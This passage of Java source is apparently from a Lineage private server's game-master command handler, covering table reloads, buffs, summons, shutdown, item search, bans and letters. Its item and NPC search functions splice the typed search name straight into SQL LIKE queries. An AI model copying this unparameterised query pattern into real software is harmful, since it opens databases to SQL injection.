			CharactersGiftItemTable.reload();
			gm.sendPackets("characters_levelup_item 테이블이 리로드 되었습니다.");
		} else if (arg.equalsIgnoreCase("밴아이피")) {
			IpTable.getInstance();
			IpTable.reload();
			gm.sendPackets("banIp 테이블이 리로드 되었습니다.");
		} else if (arg.equalsIgnoreCase("아이템")){
            try {
                CObjectDB.ReloadItem();
            } catch (IllegalStateException failure) {
                final String message = "아이템 리로드 실패: " + failure.getMessage();
                gm.sendPackets(message);
                System.err.println(message);
                return;
            }
			TIntObjectMap<L1Item> items = CObjectDB.LoadItem().getAllTemplates();
			HashMap<Integer, L1RaceTicket> map = BugRaceController.getInstance().getAllTemplates();
			for(L1RaceTicket t : map.values()){
				if(t != null)
					items.put(t.getItemId(), t);
			}
			DogFightTicketIdManager.getInstance().update_item_template();
			gm.sendPackets("아이템 정보와 장비 기본 옵션을 리로드했습니다.");
		} else if (arg.equalsIgnoreCase("상점")){
			ShopTable.reload();
			gm.sendPackets("shop 테이블이 리로드 되었습니다.");	
		} else if (arg.equalsIgnoreCase("웨폰데미지")
                || arg.equalsIgnoreCase("웨폰대미지")) {
            if (WeaponAddDamage.reload()) {
                final WeaponAddDamage loaded = WeaponAddDamage.getInstance();
                gm.sendPackets("weapon_damage 전체 리로드 완료: " + loaded.getEntryCount()
                        + "개 / 명중 보정 " + loaded.getNonZeroHitCount()
                        + "개 / 데미지 보정 " + loaded.getNonZeroDamageCount() + "개");
            } else {
                gm.sendPackets("weapon_damage 리로드 실패: 기존 설정 유지 (서버 로그 확인)");
            }
		} else if (arg.equalsIgnoreCase("클랜데이터")){
			ClanTable.reload();
			CastleWarBusiness.getInstance().reload();
			gm.sendPackets("리로드: clan_data 테이블이 리로드 되었습니다.");		
		} else if (arg.equalsIgnoreCase("공성")){
			CastleWarBusiness.getInstance().reload();
			gm.sendPackets("리로드: castle 테이블이 리로드 되었습니다.");		
		} else if (arg.equalsIgnoreCase("스폰리스트")){
			
			gm.sendPackets("[.엔피씨다운 몬스터 배치or삭제]를 이용하시길 바랍니다.");	
//		} else if (arg.equalsIgnoreCase("엔스폰리스트")){
//			NpcSpawnTable.getInstance().reload();
//			gm.sendPackets("리로드: spawnlist_npc 테이블 리로드 되었습니다.");	
		} else if (arg.equalsIgnoreCase("엔스폰리스트")){
			
			gm.sendPackets("[.엔피씨다운 엔피씨 배치or삭제]를 이용하시길 바랍니다.");	
		} else if (arg.equalsIgnoreCase("엔캐샵스폰리스트")){
			NpcCashShopSpawnTable.reload();
			gm.sendPackets("리로드: spawnlist_npc_cash_shop 테이블이 리로드 되었습니다.");	
		} else if (arg.equalsIgnoreCase("엔피씨채팅")){
			NpcChatTable.reload();
			gm.sendPackets("리로드: npcchat 테이블이 리로드 되었습니다.");
		} else if (arg.equalsIgnoreCase("던전")){
			Dungeon.reload();
			gm.sendPackets("리로드: dungeon 테이블이 리로드 되었습니다.");
		} else if (arg.equalsIgnoreCase("문")){
			DoorSpawnTable.reload();
			gm.sendPackets("리로드: spawnlist_door 테이블이 리로드 되었습니다.");
//		} else if (arg.equalsIgnoreCase("맵")){
//			MapsTable.reload();
//			gm.sendPackets("리로드: mapids 테이블이 리로드 되었습니다.");
//		} else if (arg.equalsIgnoreCase("벨런스")){
//			gm.sendPackets("리로드: character_balance 테이블이 리로드 되었습니다.");
		} else if (arg.equalsIgnoreCase("비기너")){
		//} else if (arg.equalsIgnoreCase("신규지급템")){
			Beginner.reload();
			gm.sendPackets("리로드: beginner 테이블이 리로드 되었습니다.");
		} else if (arg.equalsIgnoreCase("오토드랍")){
			AutoLoot.reload();
			gm.sendPackets("리로드: autoloot 테이블이 리로드 되었습니다.");
		} else if (arg.equalsIgnoreCase("아머인챈트")){
			ArmorEnchantList.reload();
			gm.sendPackets("리로드: armor_enchant_list 테이블이 리로드 되었습니다");
		} else if (arg.equalsIgnoreCase("웨폰인챈트")){
			WeaponEnchantList.reload();
			gm.sendPackets("리로드: weapon_enchant_list 테이블이 리로드 되었습니다");
		} else if (arg.equalsIgnoreCase("엔샵")){
			AdenShopTable.reload();
			gm.sendPackets("리로드: shop_aden 테이블이 리로드 되었습니다");
		} else if(arg.equalsIgnoreCase("방어구인챈정보")) {
			ArmorEnchantInformationTable.reload();
			gm.sendPackets("리로드: armor_enchant_list 테이블이 리로드 되었습니다");
		} else if(arg.equalsIgnoreCase("무기인챈정보")) {
			WeaponEnchantInformationTable.reload();
			gm.sendPackets("리로드: weapon_enchant_list 테이블이 리로드 되었습니다");
		} else if(arg.equalsIgnoreCase("악세인챈정보")) {
			AccessoryEnchantInformationTable.reload();
			gm.sendPackets("리로드: accessory_enchant_list 테이블이 리로드 되었습니다");
		} else if(arg.equalsIgnoreCase("세트아이템")) {
			CObjectDB.ReloadSetItem();
			gm.sendPackets("리로드: armor_set 테이블이 리로드 되었습니다");
//		} else if (arg.equalsIgnoreCase("이벤트알람")) {
//			try {
//				CWorld.getInstance().broadcastPacketToAll(new SC_SystemMessage("\\f:보스알람시간이 재정비되었습니다." ));
//				CWorld.getInstance().broadcastPacketToAll(new SC_SystemMessage("\\f:리스 후 보스알람시간표기가 리로드됩니다." ));
//				
//			} catch (Exception e) {
//				e.printStackTrace();
//			}
		} else if (arg.equalsIgnoreCase("보스스폰")) {
			if (BossController.reload()) {
				gm.sendPackets("리로드: spawnlist_boss_hot 테이블이 리로드 되었습니다");
			} else {
				gm.sendPackets("리로드 실패: 보스 스폰 DB 오류. 기존 예약을 유지합니다.");
			}
		} else if (arg.equalsIgnoreCase("답장")) {
			gm.sendPackets("리로드: letter_command 테이블이 리로드 되었습니다");
		} else if(arg.equalsIgnoreCase("마법딜")){			
			SpriteInformationLoader.getInstance().reloadSpellDelayInformation();
			gm.sendPackets("리로드: MagicDelay 테이블이 리로드 되었습니다");	
		} else if(arg.equalsIgnoreCase("광역마법")){
			EffectModelLoader.reload();
			gm.sendPackets("리로드: EffectModel 테이블이 리로드 되었습니다.");	
		} else if(arg.equalsIgnoreCase("신규보호몬스터")){
			UserProtectMonsterTable.getInstance().reload();
			gm.sendPackets("신규보호몬스터 테이블이 리로드 되었습니다.");
		} else {
			gm.sendPackets("---------------리로드 목록을 보여드립니다-------------");
			gm.sendPackets("몹드랍.템드랍아이템.변신.상점.박스.스킬.몹스킬");
			gm.sendPackets("아이템.용해제1~2.무기스킬.레벨퀘스트");
			gm.sendPackets("컨피그.물약회복.밴아이피.용해제아덴.이벤트알람");
			gm.sendPackets("엔피씨.엔피씨액션.클랜데이터.공성.보스스폰");
			gm.sendPackets("스폰리스트.엔스폰리스트.엔피씨채팅.무기인챈트");
			gm.sendPackets("엔캐샵스폰리스트.던전.맵.신규지급템.답장");
			gm.sendPackets("오토드랍.엔샵 .매크로 .악세인챈정보");
			gm.sendPackets("세트아이템.로봇.제작엔피씨.자동공지.북시스템");
			gm.sendPackets("맵아인");
			gm.sendPackets("마법딜 .광역마법 .엔피씨마크 .아인증폭 .노드랍");
			gm.sendPackets("아이템스킬 .크레프트인포 .인형인포 .제작인형컨픽");
			gm.sendPackets("액션리스너 .제작확률 .인형확률 .엔피씨다운");
			gm.sendPackets("텔주문서 .푸쉬시스템 .참시스템");
			gm.sendPackets("신규보호몬스터 .자존심 .커스시간 .버경 .회복률");
			gm.sendPackets("아머클래스 .엔피씨속도 .낚시경험치");
			gm.sendPackets("보너스아이템");
			gm.sendPackets("영자상점 .영자상점물품 .무기인챈정보 .방어구인챈정보");
			gm.sendPackets("악세인챈정보 .웨폰데미지 .스킬확률 .키링크밸런스");
		}		
	}

	private static void BuilderCmd_buff_by_id(
			L1PcInstance pc,
			String cmdName,
			String arg) {

		try {
			final StringTokenizer tok =
					new StringTokenizer(arg);

			String targetType =
					tok.nextToken();

			final boolean selfOnly =
					"나".equals(targetType);

			final Collection<L1PcInstance> players;

			final String skillToken;

			if (selfOnly) {
				players = null;
				skillToken = tok.nextToken();

			} else if ("전체".equals(targetType)) {
				players =
						CWorld.getInstance()
								.getAllPlayers();

				skillToken = tok.nextToken();

			} else {
				players =
						CWorld.getInstance()
								.getVisiblePlayer(pc);

				skillToken = targetType;
			}

			final int skillId =
					Integer.parseInt(skillToken);

			final int time =
					tok.hasMoreTokens()
							? Integer.parseInt(tok.nextToken())
							: 0;

			final L1Skills skill =
					SkillsTable.getInstance()
							.getTemplate(skillId);

			if (skill == null) {
				SC_SystemMessage.send(pc, "존재하지 않는 스킬입니다.");

				return;
			}

			final String skillTarget =
					skill.getTarget();

			if (!"buff".equals(skillTarget)
					&& !"none".equals(skillTarget)) {

				SC_SystemMessage.send(pc, "버프계의 스킬이 아닙니다. ");

				return;
			}

			/*
			 * "나"는 Collection 만들 필요 없음.
			 */
			if (selfOnly) {
				BuilderCastBuff(
						pc,
						skillId,
						time);

				return;
			}

			if (players == null || players.isEmpty()) {
				return;
			}

			for (L1PcInstance target : players) {
				if (target == null) {
					continue;
				}

				BuilderCastBuff(
						target,
						skillId,
						time);
			}

		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName
							+ " [전체, 나] [스킬아이디] [시간] 라고 입력해 주세요. ");
		}
	}


	private static void BuilderCastBuff(
			L1PcInstance target,
			int skillId,
			int time) {

		L1SkillUse.cast(
				target,
				skillId,
				target.getId(),
				target.getX(),
				target.getY(),
				null,
				time,
				L1SkillUse.TYPE_GMBUFF);
	}

	private static void BuilderCmd_summon_servitor(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer tok = new StringTokenizer(arg);
			String nameid = tok.nextToken();
			int npcid = 0;
			try {
				npcid = Integer.parseInt(nameid);
			} catch (NumberFormatException e) {
				npcid = CObjectDB.LoadNPC(). findNpcIdByNameWithoutSpace(
						nameid);
				if (npcid == 0) {
					SC_SystemMessage.send(pc, "해당 NPC가 발견되지 않습니다. ");
					return;
				}
			}
			int count = 1;
			if (tok.hasMoreTokens()) {
				count = Integer.parseInt(tok.nextToken());
			}
			L1Npc npc = CObjectDB.GetNPC(npcid);
			L1SummonInstance summonInst = null;
			for (int i = 0; i < count; i++) {
				summonInst = new L1SummonInstance(npc, pc);
				summonInst.setPetcost(0);
			}
			nameid = CObjectDB.GetNPC(npcid). get_name();
			SC_SystemMessage.send(pc, nameid + "(ID:" + npcid + ") ("
					+ count + ")를 소환했습니다. ");
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName
					+ " [npcid or name] [서먼수] 라고 입력해 주세요. ");
		}
	}

	private static void BuilderCmd_shutdown_server(L1PcInstance pc, String cmdName, String arg) {
		try {
			if (arg.equalsIgnoreCase("지금")) {
				GameServer.getInstance(). shutdownWithCountdown(0);
				return;
			}

			if (arg.equalsIgnoreCase("취소")) {
				GameServer.getInstance(). abortShutdown();
				return;
			}
			
			int sec = Math.max(5, Integer.parseInt(arg));
			GameServer.getInstance(). shutdownWithCountdown(sec);
		} catch (Exception e) {
			SC_SystemMessage.send(pc, ".종료 [대기초, 지금, 취소] 라고 입력해 주세요.");
		}
	}

	private static void BuilderCmd_find_object(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			String type = "";
			String name = "";
			String add = "";
			boolean simpleS = true;
			int itCount = 0;
			while (st.hasMoreTokens()) {
				if (itCount == 1) {
					add = "%";
				}
				String tempVar = st.nextToken();
				if (itCount == 0
						&& (tempVar.equals("갑옷") || tempVar.equals("무기")
								|| tempVar.equals("etc")
								|| tempVar.equals("변신") || tempVar
									.equals("NPC"))) {
					simpleS = false;
					type = tempVar;
				} else {
					name = name + add + tempVar;
				}
				itCount++;
			}
			if (simpleS == false) {
				BuilderFindObject(pc, type, name);
			} else {
				BuilderFindObject(pc, name);
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, ".find [갑옷,무기,etc,변신,NPC] 를 입력 해주세요");
		}
	}

	private static void BuilderFindObject(L1PcInstance pc, String type, String name) {
		String str1 = null;
		String str2 = null;
		int bless = 0;
		int count = 0;
		Connection con = null;
		PreparedStatement statement = null;
		ResultSet rs = null;
		try {
			con = DatabaseFactory.getInstance().getConnection();
			boolean error = false;

			SC_SystemMessage.send(pc, " ");

			if (type.equals("갑옷")) {
				statement = con
						.prepareStatement("SELECT item_id,name,bless FROM armor WHERE name Like '%"
								+ name + "%'");
			} else if (type.equals("무기")) {
				statement = con
						.prepareStatement("SELECT item_id,name,bless FROM weapon WHERE name Like '%"
								+ name + "%'");
			} else if (type.equals("etc")) {
				statement = con
						.prepareStatement("SELECT item_id,name,bless FROM etcitem WHERE name Like '%"
								+ name + "%'");
			} else if (type.equals("변신")) {
				statement = con
						.prepareStatement("SELECT polyid,name FROM polymorphs WHERE name Like '%"
								+ name + "%'");
			} else if (type.equals("NPC")) {
				statement = con
						.prepareStatement("SELECT npcid,name FROM npc WHERE name Like '%"
								+ name + "%'");
			} else {
				error = true;
				SC_SystemMessage.send(pc, ".find [갑옷,무기,etc,변신,NPC] 를 입력 해주세요.");
			}
			String blessed = null;
			if (error == false) {
				rs = statement.executeQuery();
				SC_SystemMessage.send(pc, "라인에 검색 하는 '"
						+ name.replace("%", " ") + " ' 는" + type + "이름...");
				while (rs.next()) {
					str1 = rs.getString(1);
					str2 = rs.getString(2);
					if (type.equals("갑옷") || type.equals("무기")
							|| type.equals("etc")) {
						bless = rs.getInt(3);
						if (bless == 1) {
							blessed = "";
						} else if (bless == 0) {
							blessed = "\\fR";
						} else {
							blessed = "\\fY";
						}
						SC_SystemMessage.send(pc, blessed + "번호: "
								+ str1 + ", " + str2);
					} else {
						SC_SystemMessage.send(pc, "번호: " + str1 + ", "
								+ str2);
					}
					count++;
				}
				SC_SystemMessage.send(pc, "찾기 " + count + " 라인에 항목"
						+ type + "타입。");
			}
		} catch (Exception e) {
		} finally {
			SQLUtil.close(rs, statement, con);
		}
	}

	private static void BuilderFindObject(L1PcInstance pc, String name) {
		String str1 = null;
		String str2 = null;
		int bless = 0;
		String blessed = null;
		Connection con = null;
		PreparedStatement statement = null;
		ResultSet rs = null;
		int count1 = 0;
		int count2 = 0;
		int count3 = 0;
		int count4 = 0;
		int count5 = 0;
		try {
			con = DatabaseFactory.getInstance().getConnection();

			SC_SystemMessage.send(pc, " ");
			SC_SystemMessage.send(pc, "라인에서 검색 한 개체 이름: '"
					+ name.replace("%", " ") + "'");

			statement = con
					.prepareStatement("SELECT item_id,name,bless FROM armor WHERE name Like '%"
							+ name + "%'");
			rs = statement.executeQuery();
			while (rs.next()) {
				if (count1 == 0) {
					SC_SystemMessage.send(pc, "갑옷:");
				}
				str1 = rs.getString(1);
				str2 = rs.getString(2);
				bless = rs.getInt(3);
				if (bless == 1) {
					blessed = "";
				} else if (bless == 0) {
					blessed = "\\fR";
				} else {
					blessed = "\\fY";
				}
				SC_SystemMessage.send(pc, blessed + "번호: " + str1
						+ ", " + str2);
				count1++;
			}
		} catch (Exception e) {
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(statement);
		}
		try {
			statement = con
					.prepareStatement("SELECT item_id,name,bless FROM weapon WHERE name Like '%"
							+ name + "%'");
			rs = statement.executeQuery();
			while (rs.next()) {
				if (count2 == 0) {
					SC_SystemMessage.send(pc, "무기:");
				}
				str1 = rs.getString(1);
				str2 = rs.getString(2);
				bless = rs.getInt(3);
				if (bless == 1) {
					blessed = "";
				} else if (bless == 0) {
					blessed = "\\fR";
				} else {
					blessed = "\\fY";
				}
				SC_SystemMessage.send(pc, blessed + "번호: " + str1
						+ ", " + str2);
				count2++;
			}
		} catch (Exception e) {
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(statement);
		}
		try {
			statement = con
					.prepareStatement("SELECT item_id,name,bless FROM etcitem WHERE name Like '%"
							+ name + "%'");
			rs = statement.executeQuery();
			while (rs.next()) {
				if (count3 == 0) {
					SC_SystemMessage.send(pc, "etc:");
				}
				str1 = rs.getString(1);
				str2 = rs.getString(2);
				bless = rs.getInt(3);
				if (bless == 1) {
					blessed = "";
				} else if (bless == 0) {
					blessed = "\\fR";
				} else {
					blessed = "\\fY";
				}
				SC_SystemMessage.send(pc, blessed + "번호: " + str1
						+ ", " + str2);
				count3++;
			}
		} catch (Exception e) {
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(statement);
		}
		try {
			statement = con
					.prepareStatement("SELECT polyid,name FROM polymorphs WHERE name Like '%"
							+ name + "%'");
			rs = statement.executeQuery();
			while (rs.next()) {
				if (count4 == 0) {
					SC_SystemMessage.send(pc, "변신:");
				}
				str1 = rs.getString(1);
				str2 = rs.getString(2);
				SC_SystemMessage.send(pc, "번호: " + str1 + ", " + str2);
				count4++;
			}
		} catch (Exception e) {
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(statement);
		}
		try {
			statement = con
					.prepareStatement("SELECT npcid,name FROM npc WHERE name Like '%"
							+ name + "%'");
			rs = statement.executeQuery();
			while (rs.next()) {
				if (count5 == 0) {
					SC_SystemMessage.send(pc, "NPC:");
				}
				str1 = rs.getString(1);
				str2 = rs.getString(2);
				SC_SystemMessage.send(pc, "번호: " + str1 + ", " + str2);
				count5++;
			}
		} catch (Exception e) {
		} finally {
			SQLUtil.close(rs, statement, con);
		}

		try {
			SC_SystemMessage.send(pc, "검색 결과:");
			String found = "";
			if (count1 > 0) {
				found += "갑옷: " + count1 + "、";
			}
			if (count2 > 0) {
				found += "무기: " + count2 + "、";
			}
			if (count3 > 0) {
				found += "etc: " + count3 + "、";
			}
			if (count4 > 0) {
				found += "변신: " + count4 + "、";
			}
			if (count5 > 0) {
				found += "NPC: " + count5 + "。";
			}
			if (found.length() > 0) {
				found = found.substring(0, found.length() - 1) + "。";
			} else {
				found = " 0 개의 항목을 발견";
			}
			SC_SystemMessage.send(pc, found);
		} catch (Exception e) {
		}
	}

	private static void BuilderCmd_delete_items(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			if (!"회수".equals(st.nextToken())) throw new IllegalArgumentException();
			L1PcInstance target = CWorld.getInstance().getPlayer(st.nextToken());
			int id = Integer.parseInt(st.nextToken());
			int count = st.hasMoreTokens() ? Integer.parseInt(st.nextToken()) : 0;
			if (id <= 0 || count < 0 || st.hasMoreTokens()) throw new IllegalArgumentException();
			builderDelete(pc, target, id, count, false);
		} catch (RuntimeException e) {
			SC_SystemMessage.send(pc, ".아이템삭제 회수 [접속 캐릭명] [아이템 고유번호] [수량/생략=전량]");
			SC_SystemMessage.send(pc, "계정·창고·전서버 일괄 SQL 삭제는 지원하지 않습니다.");
		}
	}


	

	

	


	static private String BuilderQueryCClass( String ip )
	{
		return ip.substring(0, ip.lastIndexOf('.'));
	}



	private static void BuilderCmd_query_character(L1PcInstance pc, String cmdName, String arg) {
		try
		{
			L1PcInstance target = CWorld.getInstance(). getPlayer(arg);

			if (target != null) {
				long totalAdena = 0;
				CUserSocket client = target.getNetConnection();
				
				if (client == null)
				{
					SC_SystemMessage.send(pc, "접속중이지 않은 캐릭터에 대해 조회할 수 없습니다.");
					return;
				}
				
				String cClass = BuilderQueryCClass(client.getIp());

				Collection<L1PcInstance> pcs = CWorld.getInstance().getAllPlayers();

				for (L1PcInstance otherPc : pcs) {
					
					if (otherPc.getNetConnection() != null)
					{
						String otherPcIp = otherPc.getNetConnection().getIp();
						
						if(cClass.equals(BuilderQueryCClass(otherPcIp)))
						{
							totalAdena += BuilderQueryPrintInfo(pc, otherPc, otherPcIp);
						}
					}
				}
				
				SC_SystemMessage.send(pc, "모든 계정내의 아데나 총합계는 [" + totalAdena + "] 입니다.");
				
			} else {
				SC_SystemMessage.send(pc, "그러한 이름의 캐릭터는 월드내에는 존재하지 않습니다. ");
			}
			
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " [캐릭터명] 으로 입력해 주세요. ");
		}
	}
	
	private static long BuilderQueryPrintInfo(L1PcInstance master, L1PcInstance pc, String ip)
	{
		Connection conn = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		long storageAdena = 0;
		long characterAdena = 0;
		try {

			conn = DatabaseFactory.getInstance().getConnection();
			pstm = conn.prepareStatement("select ifnull(sum(count), 0) as 'adena' from character_warehouse where item_id = 40308 and account_name = ?");
			pstm.setString(1, pc.getAccountName());
			rs = pstm.executeQuery();
			if (rs.next()) {
				storageAdena = rs.getInt("adena");
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(conn);
		}
		
		try {

			conn = DatabaseFactory.getInstance().getConnection();
			pstm = conn.prepareStatement("select ifnull(sum(count), 0) as 'adena' from character_items where item_id = 40308 and char_id IN (select objid FROM characters WHERE account_name = ?)");
			pstm.setString(1, pc.getAccountName());
			rs = pstm.executeQuery();
			if (rs.next()) {
				characterAdena = rs.getInt("adena");
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(conn);
		}
	
		SC_SystemMessage.send(master, ip + "에서 [" + pc.getName() + "]가 현재 접속중이며 계정 창고 아데나는 [" + storageAdena + "] 캐릭 내 아데나 총 합은 [" + characterAdena + "] 입니다.");
		
		return storageAdena + characterAdena;
	}

	private static void BuilderCmd_party_recall(L1PcInstance pc, String cmdName, String arg) {
		L1PcInstance target = CWorld.getInstance(). getPlayer(arg);

		if (target != null) {
			CParty party = target.getParty();
			if (party != null) {
				int x = pc.getX();
				int y = pc.getY() + 2;
				short map = pc.getMapId();
				L1PcInstance[] players = party.getMembers();
				try(var shared=new l1j.server.server.model.network.core.broadcast.CAsyncSendConstBuffer(
       SC_SystemMessage.nativeWriter("메티스님께서 소환하였습니다."),Integer.MIN_VALUE,Integer.MAX_VALUE)) {
for (L1PcInstance pc2 : players) {
					try {
						pc2.start_teleport(x, y, map, 5, 169, true, false);
						l1j.server.server.model.network.core.broadcast.CSharedBroadcast.sendRecipient(shared,pc2);
					} catch (Exception e) {
						_log.log(Level.SEVERE, "", e);
					}
				}
}
			} else {
				SC_SystemMessage.send(pc, "파티 멤버가 아닙니다. ");
			}
		} else {
			SC_SystemMessage.send(pc, "그러한 캐릭터는 없습니다. ");
		}
	}

	private static void BuilderCmd_letter_reply(L1PcInstance pc, String cmdName, String arg) {
		try{
			StringTokenizer st = new StringTokenizer(arg);
			String name = st.nextToken();
			int letter_id = Integer.parseInt(st.nextToken());

		/*	if (!pc.getName().equalsIgnoreCase("메티스") && !pc.getName().equalsIgnoreCase("카시오페아") && !pc.getName().equalsIgnoreCase("미소피아") && !pc.getName().equalsIgnoreCase("운영자")) {
				SC_SystemMessage.send(pc, "운영자가 성립되지 않았습니다.");
				return;
			}*/
			
			if(name != null){
				BuilderLetter_WritePrivateMail(pc, name, letter_id);
			}
		}catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " [캐릭터명] [번호] 입력해 주세요.");
		}
	}
	/** 개인편지 자동으로 보내기 **/
	private static void BuilderLetter_WritePrivateMail(L1PcInstance sender, String receiverName, int letterId) {
        final l1j.server.server.model.network.core.connection.CUserSocket session=sender.getNetConnection();
        final int stamp=sender.getSessionStamp();
        final String senderName=sender.getName();
        l1j.server.server.storage.CacheD.getInstance().submitDbJobOrdered(sender.getId(),()->{
            if(session==null || !session.isConnected() || session.getActiveChar()!=sender
                    || sender.getSessionStamp()!=stamp)return;
            try(Connection con=DatabaseFactory.getInstance().getConnection();
                PreparedStatement ps=con.prepareStatement("SELECT subject,content FROM letter_command WHERE id=?")) {
                ps.setInt(1,letterId);
                try(ResultSet rows=ps.executeQuery()) {
                    if(!rows.next())return;
                    String subject=rows.getString(1),content=rows.getString(2);
                    if(subject==null || content==null)return;
                    LetterTable.getInstance().writeLetter(949,new Timestamp(System.currentTimeMillis()),
                        senderName,receiverName,0,subject,content,sender,()->{
                            SC_SystemMessage.send(sender,receiverName+"님께 편지를 보냈습니다.");
                            L1PcInstance target=CWorld.getInstance().getPlayer(receiverName);
                            if(target!=null)l1j.server.server.model.network.thread.CIOThreadCallback.getInstance()
                                .completeWarehouseMove(target,target.getSessionStamp(),
                                    ()->BuilderLetter_sendMessageToReceiver(target,sender,0,50),failure->{});
                        });
                }
            }catch(Exception failure){throw new IllegalStateException("Letter command failed",failure);}
        });
    }

	private static void BuilderLetter_LetterList(L1PcInstance pc, int type, int count) {
		SC_LetterList.sendListAsync(pc, type, count);
	}

	private static void BuilderLetter_sendMessageToReceiver(L1PcInstance receiver, L1PcInstance sender, final int type, final int MAILBOX_SIZE) {
		if (receiver != null && receiver.getOnlineStatus() != 0) {
			BuilderLetter_LetterList(receiver, type, MAILBOX_SIZE);
			SC_SkillSound.send(receiver, receiver.getId(), 1091);
			SC_ServerMessage.send(receiver, 428); // 편지가 도착했습니다.
			SC_LetterList.sendListAsync(sender, type, MAILBOX_SIZE);
			return;
		}
	}

	private static void BuilderCmd_level_present(L1PcInstance pc, String cmdName, String arg) {
		SC_SystemMessage.send(pc, "렙선물은 오프라인 창고 원자 처리 검증 전까지 중지합니다. .전체선물 또는 .선물을 이용하십시오.");
	}







	private static void BuilderCmd_impact_npc(L1PcInstance pc, String cmdName, String arg) {
		BuilderSpawnImpact(pc, true, arg);
	}

	private static void BuilderCmd_impact_effect(L1PcInstance pc, String cmdName, String arg) {
		BuilderSpawnImpact(pc, false, arg);
	}

	private static final class BuilderSkillGfxTask implements Runnable {
		private L1PcInstance _pc = null;
		private int _sprid;
		private int _count;
		
		public BuilderSkillGfxTask(L1PcInstance pc, int sprid, int count) {
			_pc = pc;
			_sprid = sprid;
			_count = count;
		}

		@Override
		public void run() {
			for (int i = 0; i < _count; i++) {
				try {
					Thread.sleep(500);
					int num = _sprid + i;
					if(_pc.getOnlineStatus() == 0)
						break;
					SC_SystemMessage.send(_pc, "스킬번호: "+num+"");
					SC_SkillSound.send(_pc, _pc.getId(), _sprid+i);
					SC_SkillSound.broadcast(_pc, _pc.getId(), _sprid+i);
				} catch (Exception exception) {
					break;
				}
			}

		}

	}
	

	private static void BuilderCmd_skill_gfx(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			int sprid = Integer.parseInt(st.nextToken(), 10);
			int count = Integer.parseInt(st.nextToken(), 10);
			
			BuilderSkillGfxTask spr = new BuilderSkillGfxTask(pc, sprid, count);
			CWorldWork.execute(spr);
			
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " [castgfx] 라고 입력해 주세요. ");
		}
	}

	private static void BuilderCmd_power_kick(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			String				sname	= st.nextToken();
			if(sname == null || sname.equalsIgnoreCase(""))
				throw new Exception("");
			
			Integer reason = SC_LoginResult.banServerCodes.get(Integer.parseInt(st.nextToken()));
			if(reason == null)
				throw new Exception("");
			
			L1PcInstance target = CWorld.getInstance().getPlayer(sname);
			IpTable iptable = IpTable.getInstance();
			if (target != null) {
				if (target.isGm()) {
					SC_SystemMessage.send(pc, "운영자는 벤처리 되지않습니다.");
					return;
				}
				Account.ban(target.getAccountName(), reason); // 계정을 BAN시킨다.
				
				if(!iptable.isBannedIp(target.getNetConnection().getIp()))
					iptable.banIp(target.getNetConnection().getIp()); // BAN 리스트에IP를 추가한다.
				else
					SC_SystemMessage.send(pc, " 이미등록된 아이피 : " + target.getNetConnection().getIp());
				SC_SystemMessage.send(pc, (new StringBuilder()).append(target.getName()).append(" 를 영구 추방 했습니다. ").toString());
				

			} else {
				String name = BuilderPowerKickLoadCharacter(sname);
				if (name != null) {
					Account.ban(name, reason);
					String nc = Account.checkIP(name);
					if (nc != null){

						if(!iptable.isBannedIp(nc))
							iptable.banIp(nc);
						else
							SC_SystemMessage.send(pc, name + " 이미등록된 아이피 : " + nc);
					}
					
					SC_SystemMessage.send(pc, name + " 를 계정압류 하였습니다.");
				}
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " [캐릭터명] [압류사유번호] 으로 입력해 주세요. ");
			SC_SystemMessage.send(pc, "사유1: 불법프로그램 사용/ 사유2: 공공의 안녕, 질서/ 사유3: 상업적인 목적의 광고");
		}
	}


	
	private static String BuilderPowerKickLoadCharacter(String charName) {
		Connection con = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		String name = null;
		try {
			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("SELECT * FROM characters WHERE char_name=?");
			pstm.setString(1, charName);

			rs = pstm.executeQuery();

			if (rs.next()) {
				name = rs.getString("account_name");
			}

		} catch (Exception e) {
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
		return name;
	}

	private static final class BuilderEffectGfxTask implements Runnable {
		private L1PcInstance _pc = null;
		private int _sprid;
		private int _count;
		
		public BuilderEffectGfxTask(L1PcInstance pc, int sprid, int count) {
			_pc = pc;
			_sprid = sprid;
			_count = count;
		}

		@Override
		public void run() {
			for (int i = _sprid; i <= _count; i++) {
				try {				
					
				if(BuilderCmdHandler.getInstance().Stop){				
					SC_SystemMessage.send(_pc, "이펙트 번호: "+i+"");
					SC_SkillSound.send(_pc, _pc.getId(), i);			
					Thread.sleep(1000);
				}else{
					break;	
				}
				} catch (Exception exception) {
					break;
				}
			}
		}
	}
	

	private static void BuilderCmd_skill_effect(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			int sprid = Integer.parseInt(st.nextToken(), 10);
			int count = Integer.parseInt(st.nextToken(), 10);
			BuilderEffectGfxTask spr = new BuilderEffectGfxTask(pc, sprid, count);
			CWorldWork.execute(spr);
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " [숫자,숫자] 라고 입력해 주세요. ");
		}
	}

